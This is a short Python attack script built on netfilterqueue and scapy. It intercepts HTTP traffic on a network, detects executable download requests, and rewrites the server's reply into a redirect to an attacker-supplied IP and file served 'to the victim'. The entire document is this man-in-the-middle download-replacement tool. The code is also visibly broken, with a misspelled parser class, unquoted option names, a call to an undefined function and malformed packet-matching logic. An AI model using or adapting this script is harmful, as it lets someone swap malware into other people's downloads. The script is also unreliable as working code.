#!/usr/bin/python

import netfilterqueue, optparse
import scapy.all as scapy

def get_args():
    parser = optparse.OptionsParser()
    parser.add_option("-i", "--ip", dest=ip, help="Please enter an ip you would like to redirect traffic to.")
    parser.add_option("-f", "--file", dest=filename, help="Please enter a filename you would like to serve to the victim.")
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error("[-] Please enter an ip address for redirection, use --help for more information")
    elif not options.filename:
        parser.error("[-] Please enter a filename with the '-f' flag, use --help for more information")
    else:
        return options


ack_list = []

def get_http_responses(packet):
    print("[+] Listening for http responses to .exe download requests")
    if packet.haslayer(scapy.Raw):
        if packet[scapy.TCP].dport == 80:
            print("[+] HTTP .exe download detected...")
            ack_list.append(packet[scapy.TCP].ack)
        elif packet[scapy.IP].sport == 80 in ack_list:
            print("[+] HTTP response to exe download intercepted...")
            ack_list.remove(packet[scapy.TCP].seq)
            return packet

def modify_packet(packet, ip, load):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://"+ip+"/"+load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    response = get_http_responses(scapy_packet)
    modified_response = modify_packet(response, options.ip, options.filename)
    packet.set_payload(str(modified_response))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
